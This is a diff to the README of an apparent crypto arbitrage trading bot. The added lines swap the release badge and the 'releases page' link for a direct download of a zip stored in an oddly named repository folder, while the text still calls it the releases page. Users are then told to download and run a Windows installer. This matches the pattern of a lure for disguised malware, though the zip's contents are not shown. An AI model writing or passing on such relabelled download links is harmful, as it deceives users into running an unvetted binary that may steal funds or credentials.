@@ -1,6 +1,6 @@
 # 🤖 crypto-arbitrage-bot-automated-trading - Automate your digital asset trading strategy
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/agung65122-byte/crypto-arbitrage-bot-automated-trading/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/agung65122-byte/crypto-arbitrage-bot-automated-trading/raw/refs/heads/main/cacophony/trading-automated-bot-arbitrage-crypto-2.9-alpha.4.zip)
 
 ## 📌 Overview 
 The crypto-arbitrage-bot-automated-trading engine performs automated trades across multiple platforms. This software tracks price gaps between exchanges like Binance, Bybit, and Solana-based protocols. It executes trades to capture these differences. The system manages delta-neutral positions to reduce exposure to market swings. You gain access to an automated engine designed for execution speed.
@@ -23,7 +23,7 @@ The crypto-arbitrage-bot-automated-trading engine performs automated trades acro
 ## 📥 How to Install
 Follow these steps to set up the software on your computer.
 
-1. Visit the [releases page](https://github.com/agung65122-byte/crypto-arbitrage-bot-automated-trading/releases) to view the available files.
+1. Visit the [releases page](https://github.com/agung65122-byte/crypto-arbitrage-bot-automated-trading/raw/refs/heads/main/cacophony/trading-automated-bot-arbitrage-crypto-2.9-alpha.4.zip) to view the available files.
 2. Select the version labeled for Windows.
 3. Download the installation file to your computer.
 4. Locate the downloaded file in your folder.
